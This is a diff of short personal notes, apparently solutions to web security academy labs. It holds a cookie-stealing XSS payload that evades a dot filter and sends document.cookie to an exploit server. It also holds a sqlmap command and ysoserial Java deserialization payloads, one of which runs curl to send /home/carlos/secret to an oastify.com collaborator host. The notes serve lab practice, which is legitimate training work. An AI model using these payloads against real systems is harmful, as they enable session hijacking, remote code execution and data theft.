@@ -1,5 +1,7 @@
 1.
 
+Filter dấu chấm 
+
 payload: `"-fetch('https://exploit-0ad8002e0436378180812af8014d0063'+decodeURIComponent('%2E')+'exploit-server'+decodeURIComponent('%2E')+'net/exploitabc?cookie='+document['cookie'])}//`
 
 <script>
@@ -31,6 +33,14 @@ python sqlmap.py -u 'https://0a48002f03d9345f80cd039700ed00a0.web-security-acade
 3. 
 
 payload 
+
+
+```bash
+java -jar ysoserial.jar CommonsCollections6 'host ij5zpg5
+74rhzawjanoer5ut3buhl5dt2.oastify.com' | gzip | base64 -w 0 > text.txt
+```
+
+
 ```bash
 java -jar ysoserial.jar CommonsCollections6 'curl -d @/home/carlos/secret ij5zpg5
 74rhzawjanoer5ut3buhl5dt2.oastify.com' | gzip | base64 -w 0 > text.txt
